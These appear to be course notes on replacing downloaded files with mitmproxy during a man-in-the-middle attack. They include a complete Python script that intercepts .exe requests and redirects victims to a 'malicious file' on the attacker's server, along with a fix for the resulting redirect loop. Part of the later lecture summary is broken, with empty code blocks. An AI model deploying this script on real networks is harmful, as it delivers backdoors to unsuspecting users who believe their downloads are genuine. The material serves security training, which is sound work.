# intercepting & *replacing downloads* with mitmproxy scripts (concise)

## Big picture / 3 methods to replace a downloaded file

1. **Alter the page (HTML/JS)** — change `<a href>` or inject JS so the download URL points to your file.

   * Easy, done in-proxy by editing responses or injecting JS.
2. **Modify the response body** — intercept the server response that *contains* the binary and replace bytes in the response body.

   * Works but fragile for large/binary files; easier for small predictable payloads.
3. **Create a new response (recommended)** — intercept the *request* for the file and return your own HTTP response (your binary backdoor) instead of forwarding to the original server.

   * Robust, works if you only see requests (e.g. one-way spoofing) and safer for binary transfers.
   * **This is the method used in the lectures.**

---

## Why use a script (mitmproxy) here

* mitmproxy/mitmdump/gui alone can intercept/edit text responses easily, but creating full custom responses or reliably serving binary files requires a script using the mitmproxy Python API.
* Scripts let you inspect `flow`, test conditions (file extension, host, path), and then return `flow.response = http.Response.make(...)` with a binary body and proper headers.

---

## Key mitmproxy concepts used

* `flow` — central object representing a request/response exchange.

  * `flow.request` — request object (has `.url`, `.pretty_url`, `.path`, `.host`, `.headers`, etc.)
  * `flow.response` — response object.
* Write handlers:

```py
import mitmproxy  

def request(flow):
    # called when a request arrives

def response(flow):
    # called when a response arrives
```

* Use string tests and Python conditionals to pick only relevant flows:

  * `if flow.request.pretty_url.endswith(".exe"):` (or `.zip`, `.pdf`, `.png`, whatever you target)

# Creating a Custom Redirect Response in **mitmproxy**

## 🎯 Goal

Intercept any HTTP request for a file (e.g., `.exe`,`.pdf`) and **redirect** the download to a fake file hosted on your own web server.

---

## 🧠 Logic Overview

1. **Detect target requests** → Check if the URL ends with `.pdf` `.exe`.
2. **Generate a custom HTTP response** → Use mitmproxy’s built-in `http.Response.make()` method.
3. **Return a redirect (HTTP 301)** → Point the victim to your malicious file’s location.

---

## 🧩 Step-by-Step Breakdown

### 1. Detect “interesting” flows

Use a conditional to only handle requests that end with `.exe`:

```python
if flow.request.pretty_url.endswith(".exe"):
```

This ensures your code only affects download requests (e.g., `file.exe`).

---

### 2. Create a custom HTTP response

mitmproxy allows manual response creation using:

```python
http.Response.make(status_code, content, headers)
```

It takes **three arguments**:

1. **HTTP status code** → tells the browser what happened
2. **Content (body)** → optional; can be empty if you redirect
3. **Headers** → additional response fields (e.g., Location, Content-Type)

---

### 3. Use `301 Moved Permanently` to redirect

* `301` is a legitimate HTTP status code for *permanent redirection*.
* The **browser automatically follows** the new “Location” you specify.

Example header:

```python
{"Location": "http://10.0.2.15/file.exe"}
```

This causes the browser to immediately fetch your hosted file instead of the original.

---

### 4. Final script example

```python
from mitmproxy import http

def request(flow: http.HTTPFlow):
    # Only act on .exe downloads
    if flow.request.pretty_url.endswith(".exe"):
        print("[+] Got an interesting flow — redirecting to malicious file")

        # Create a 301 redirect response
        flow.response = http.Response.make(
            301,  # HTTP Status: Moved Permanently
            b"",  # No body since we’re redirecting
            {"Location": "http://<Server or Your IP>/file.exe"}  # New file location
        )
```

---

## ⚙️ Explanation

* **`flow.request.pretty_url`** → Full URL of the request.
* **`301` status** → Instructs the client to go somewhere else.
* **`Location` header** → Destination for the redirect.
* **`flow.response`** → Assigning this tells mitmproxy to stop forwarding the request and use your custom response.

## 🧠 Lecture Summary: Using a Custom Response to Replace File Downloads

### 🎯 Objective

To make the script **intercept downloads** (like `.exe` files) and **replace them** with a different file — such as one hosted on your own web server.

---

### 🧩 Step-by-Step Breakdown

1. **Identifying Target Flows**

   * The script detects requests where the URL ends with `.exe`.
   * These are considered *“interesting flows”* — likely file downloads.

2. **Creating a Custom HTTP Response**

   * Uses:


     * **Status Code:** `301` → means *“Moved Permanently”* (redirect).

3. **Assigning the Response**

     ```python

     ```

### ⚠️ Loop Problem and Fix

* **Problem:** The browser got stuck in a redirect loop.

  * Why? Because the redirected `.exe` file also matched the same `.exe` condition.
* **Fix:** Add another condition:

  ```python
  if flow.request.host != "<Server Or Your IP>" and flow.request.pretty_url.endswith(".exe"):
  ```

  * This prevents the script from reprocessing your own redirection host.
